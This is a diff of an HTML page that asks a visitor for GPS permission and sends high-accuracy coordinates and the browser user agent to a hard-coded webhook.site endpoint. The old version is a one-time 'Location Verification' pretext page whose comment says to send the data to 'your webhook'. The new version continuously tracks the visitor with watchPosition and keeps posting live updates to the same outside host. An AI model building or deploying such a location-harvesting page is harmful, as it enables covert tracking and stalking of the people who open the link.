@@ -1,20 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Location Verification</title>
+  <title>Live Location Tracking</title>
   <meta charset="UTF-8">
 </head>
 <body>
 
-<h3>Location Verification</h3>
-<p id="status">Requesting GPS permission…</p>
+<h3>Live Location Tracking</h3>
+<p id="status">Waiting for GPS permission…</p>
+<p id="coords"></p>
 
 <script>
 if (!navigator.geolocation) {
   document.getElementById("status").innerText =
     "Geolocation not supported on this device.";
 } else {
-  navigator.geolocation.getCurrentPosition(
+
+  document.getElementById("status").innerText =
+    "Live tracking started. Keep this page open.";
+
+  navigator.geolocation.watchPosition(
     (pos) => {
       const data = {
         latitude: pos.coords.latitude,
@@ -24,7 +29,13 @@ if (!navigator.geolocation) {
         userAgent: navigator.userAgent
       };
 
-      // SEND GPS DATA TO YOUR WEBHOOK (NO CORS BLOCK)
+      // Display on user's screen
+      document.getElementById("coords").innerText =
+        `Latitude: ${data.latitude}
+Longitude: ${data.longitude}
+Accuracy: ${data.accuracy} meters`;
+
+      // Send LIVE updates to your endpoint
       fetch("https://webhook.site/30f14c22-c02f-4d1c-ad3c-6e72844a7dc6", {
         method: "POST",
         mode: "no-cors",
@@ -33,18 +44,15 @@ if (!navigator.geolocation) {
         },
         body: JSON.stringify(data)
       });
-
-      document.getElementById("status").innerText =
-        "Location captured successfully.";
     },
     (err) => {
       document.getElementById("status").innerText =
-        "Location access denied.";
+        "Location access stopped or denied.";
     },
     {
       enableHighAccuracy: true,
-      timeout: 15000,
-      maximumAge: 0
+      maximumAge: 0,
+      timeout: 15000
     }
   );
 }
@@ -53,7 +61,9 @@ if (!navigator.geolocation) {
 </body>
 </html>
 
-</html>
+
+
+
 
 
 
